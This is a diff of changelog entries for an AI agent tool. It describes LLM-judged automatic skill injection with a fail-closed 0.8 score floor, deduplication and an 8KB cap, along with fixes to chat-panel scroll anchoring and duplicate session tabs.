+- **Top ONE skill, chosen by the judge, not the embedder.** `judgeRelevanceQuestions`
+  now returns the raw per-candidate `noul` alongside the keep set (the boolean could
+  not express "how relevant"); the veto semantics of all three judges that share it —
+  discovery, doc_search, tool search — are unchanged, and a VETOED candidate still
+  reports its real score. `pickAutoInjectSkill` takes the highest-scoring `skill`
+  candidate, tie-broken by embedder rank. MCP tools and project-doc summaries are
+  never inlined: the first is a separate gate, the second already ships as a summary.
+  (`internal/agent/relevance_typesafe.go`, `discovery_typesafe.go`,
+  `discovery_autoinject.go`)
+- **Its own floor, `0.8`, and it fails CLOSED.** Deliberately neither the lenient
+  relevance floor (`0.5`, where the rule is "even slight relevancy is presented" —
+  fine for printing a name, not for inlining a body) nor
+  `permissions.auto.min_confidence` (which would couple a prompt-spend decision to a
+  permission tuning). No judge, a judge transport error, or a missing/non-noul answer
+  all leave no score, and no score means no injection — the opposite of the veto
+  judges' fail-open rule, and deliberately so. The top skill's real score is logged
+  every judged turn, floor or not, so the constant can be tuned against observed
+  numbers instead of guessed at. Hardcoded, not config.
+- **Never twice.** A skill is a candidate only on the turn it first attaches
+  (`Session.Select` skips attached docs), so selection happens at most once per skill
+  per session. On top of that, a sticky set refuses a replay, and
+  `chatAlreadyHasSkill` scans the WHOLE transcript for a prior `skill`/`load_skill`
+  call naming it, its `Source` path in any message, or a previous injection block — so
+  content the model already has is never re-injected. Compaction clears the sticky set
+  (`resetAutoInjected`, beside `resetDirMDSeen`), because these blocks are request-time
+  and never persisted: after a splice the model genuinely lost them, and the next
+  judged turn may re-select.
+- **Bounded at 8KB, cut on a line boundary, and user-role.** Capped head is kept
+  (frontmatter + workflow), the block says so, and the rest is one `skill` call away.
+  User-role is load-bearing, not cosmetic: `collectAndRemoveSystemMessages` hoists
+  EVERY system message into the cached `system` field, so a per-turn-varying
+  injection there would invalidate the whole cached prefix. A test pins that the
+  system block is byte-identical whether or not the injection fires.
+- **Fixed a latent root bug on the way.** `skill.LoadSkill` resolved the project root
+  from `os.Getwd()` — the *server process's* cwd, which is the wrong root for any
+  session not rooted there. Added `skill.LoadSkillForRoot`; `LoadSkill` delegates with
+  the cwd exactly as before, so `internal/tool` and `internal/memory` are unaffected.
+  (`internal/skill/loader.go`)
+- Auto-inject fires only on the automatic per-turn path, never from `discover_more`,
+  where the model asked for more and will load the body itself.
+
+## 2026-10-01 — Web/desktop chat no longer bounces a scrolled-up reader at the end of a turn
+
+- **Window slides keep the reader's row.** On a transcript longer than the initial
+  100-row page, the turn-end `messages` snapshot swapped in the 400-row window
+  (≈300 rows above the reader), the reconcile snapshot shrank it back a few seconds
+  later, and the shrink was read as a "transcript reset" that pinned the reader to
+  the bottom. `ChatPanel` now remembers the row under the top edge while un-pinned
+  and restores it (same row, same pixel) in a layout effect after any window
+  change; a genuine truncate still re-arms the tail follow. The anchor helpers ask
+  for start-aligned offsets. (`web/src/components/Chat/ChatPanel.tsx`,
+  `chatDisplayScroll.ts`)
+- **One tab per session across projects.** A deep link or picker could open a
+  session under a second project, giving `App.tsx` two panes with one React key —
+  React then re-created the pane on renders, stale copies piled up in the DOM, and
+  each copy reloaded and re-pinned the transcript. `ADD_TAB` refuses the copy and
+  focuses (and switches to) the owning project; restores/merges drop cross-project
+  duplicates; pane keys include the project path. (`web/src/stores/projectStore.tsx`,
+  `web/src/App.tsx`)
+- Details: `docs/gotchas/chat-scroll-bounce-clamped-pin-vs-user-intent.md` (root
+  causes 5 and 6).
+
 ## 2026-09-30 — Desktop boot no longer stalls on restored tabs and terminals, and a big terminal log no longer pins the renderer
 
 Three related boot/renderer fixes, all in the same place: work the desktop app did
